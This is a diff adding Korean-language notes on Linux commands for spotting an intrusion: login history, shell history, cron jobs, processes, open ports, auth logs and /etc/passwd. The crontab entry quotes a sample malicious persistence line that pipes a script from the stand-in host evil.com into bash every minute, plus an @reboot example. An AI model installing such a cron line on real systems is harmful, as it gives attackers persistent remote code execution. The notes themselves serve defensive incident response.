@@ -1,0 +1,38 @@
+	COMMANDS
+	
+- last: 성공한 로그인 기록 확인
+	-> 로그인 시간, ip, logout 없이 끝난 세션 등...
+
+- sudo lastb: 실패한 로그인 기록
+	-> IP 하나가 몇 초 간격으로 root 로그인을 계속 시도 → 공격
+	-> 존재하지 않는 계정 이름으로 시도 (adm, admin 등)
+	
+- cat ~/.bash_history: 해당 사용자가 실행한 명령어 기록
+	-> 공격자가 서버에 들어와 뭘 했는지 추적 가능
+	
+- crontab -l
+- sudo cat /etc/crontab: 특정 시간마다 자동 실행되는 스케줄러
+			  공격자들은 원격 접속 스크립트를 여기에 숨겨둠
+		  -> ex1) * * * * * curl http://evil.com/x.sh | bash
+		  	-> 1분마다 악성 스크립트 실행
+		  -> ex2) @reboot /tmp/tmp1234
+		  	-> 재부팅하면 악성 프로그램이 자동 실행
+		  	
+- ps aux: 현재 실행 중인 프로세스 조사
+	-> /tmp, /dev/shm 에서 실행
+	-> 이름이 이상함 (kworker2, xmrig, .xxx 숨김파일)
+	-> CPU 사용량 30% 이상
+	
+- ss -tulpn
+- netstat -tulpn: 어떤 프로그램이 어떤 포트로 외부와 통신 중인지
+		-> 4444, 5555, 1337 등 비정상 포트는 주의.
+		
+- sudo tail -n 50 /var/log/auth.log: 인증 관련 모든 보안 로그
+		
+- /etc/passwd: 시스템에 있는 모든 계정 목록
+	-> 공격자가 만든 사용자 찾기
+	-> ex) UID가 0이면 root 권한 ->? 공격자가 만든 “가짜 root 계정”
+		
+		
+		
+		
